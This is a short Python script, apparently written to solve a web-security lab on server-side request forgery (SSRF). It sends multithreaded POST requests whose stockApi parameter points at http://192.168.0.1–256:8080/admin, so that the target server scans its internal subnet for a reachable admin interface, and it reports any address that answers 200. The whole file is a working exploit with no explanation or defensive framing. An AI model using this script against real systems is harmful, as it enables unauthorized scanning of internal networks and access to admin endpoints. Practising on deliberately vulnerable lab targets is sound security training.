## Lab: Basic SSRF against another back-end system, searching for another machine in the same subnet.
import requests
import threading
import sys

url = input("What is the URL?" )
params = "/product/stock"
uri = (url + params)
headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'https://{url}/product?productId=1'}

def numbers():
	for i in range(1, 257):
		yield i

def send_request(a):
    payload = {'stockApi': f'http://192.168.0.{a}:8080/admin'}
    print(f"sending payload: {payload}")
    try:
        response = requests.post(uri, headers=headers, data=payload)
        if response.status_code not in (500, 400):
            print(f"Response for {a}: {response.status_code}")
        if response.status_code == 200:
            s = print(f"Found The IP at 192.168.0.{a}.")
            sys.exit()
    except requests.exceptions.RequestException as e:
        print(f"") ## prints nothing cuz ye

threads = []

for a in numbers():
	t = threading.Thread(target=send_request, args=(a,))
	threads.append(t)
	t.start()

for t in threads:
	t.join()
